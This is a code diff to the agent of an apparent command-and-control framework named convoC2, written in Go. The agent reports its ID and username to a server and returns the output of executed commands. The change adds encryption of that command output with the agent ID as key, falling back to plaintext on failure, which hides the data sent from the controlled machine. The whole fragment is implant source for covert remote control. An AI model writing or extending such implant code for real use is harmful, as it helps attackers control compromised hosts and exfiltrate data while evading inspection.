@@ -7,6 +7,8 @@ import (
 	"fmt"
 	"net/http"
 	"strings"
+
+	"github.com/cxnturi0n/convoC2/pkg/crypto"
 )
 
 type CommandOutputMsg struct {
@@ -27,7 +29,7 @@ type NotifyMsg struct {
 func (agent *Agent) notifyServer(webhookURL string, serverURL string) error {
 
 	notifyMsg := NotifyMsg{
-		Random:   random(), 
+		Random:   random(),
 		AgentID:  agent.agentID,
 		Username: agent.username,
 	}
@@ -52,8 +54,15 @@ func (agent *Agent) notifyServer(webhookURL string, serverURL string) error {
 
 func (agent *Agent) sendResultToServer(commandOutput CommandOutput, webhookURL string, serverURL string) error {
 
+	// Encrypt the command output
+	encryptedOutput, err := crypto.Encrypt(commandOutput.Output, agent.agentID)
+	if err != nil {
+		// Fallback to unencrypted if encryption fails
+		encryptedOutput = commandOutput.Output
+	}
+
 	commandResponse := CommandOutputMsg{
-		Output:   commandOutput.Output,
+		Output:   encryptedOutput,
 		Success:  commandOutput.Success,
 		Command:  commandOutput.Command,
 		Random:   random(),
